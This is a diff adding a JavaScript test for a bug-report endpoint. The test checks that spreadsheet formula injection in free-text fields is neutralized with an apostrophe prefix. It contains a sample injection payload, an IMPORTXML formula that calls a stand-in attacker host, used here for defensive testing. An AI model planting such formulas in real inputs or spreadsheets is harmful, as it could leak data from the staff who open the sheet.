@@ -87,6 +87,26 @@ describe("POST /api/bug-reports", () => {
     expect(await listBugReportFiles()).toHaveLength(0);
   });
 
+  it("neutralizes spreadsheet formula injection in free-text fields before writing to the sheet - this endpoint is unauthenticated, so an attacker's =IMPORTXML(...)/=HYPERLINK(...) payload would otherwise execute for whichever staff member later opens the Bug-Reports sheet", async () => {
+    const res = await request(app)
+      .post("/api/bug-reports")
+      .set(authHeader)
+      .send({
+        ...validBody,
+        title: '=IMPORTXML("https://attacker.example/x","//x")',
+        description: "+1 formula too",
+        route: "-also a formula",
+        appState: "@mentions trigger formulas in Sheets too",
+        bugReportsSpreadsheetId: "sheet-abc",
+      });
+
+    expect(res.status).toBe(200);
+    expect(lastAppendedRow[4]).toBe("'=IMPORTXML(\"https://attacker.example/x\",\"//x\")");
+    expect(lastAppendedRow[5]).toBe("'+1 formula too");
+    expect(lastAppendedRow[6]).toBe("'-also a formula");
+    expect(lastAppendedRow[7]).toBe("'@mentions trigger formulas in Sheets too");
+  });
+
   it("falls back to a local .md file when no Bug Reports spreadsheet is configured", async () => {
     const res = await request(app)
       .post("/api/bug-reports")
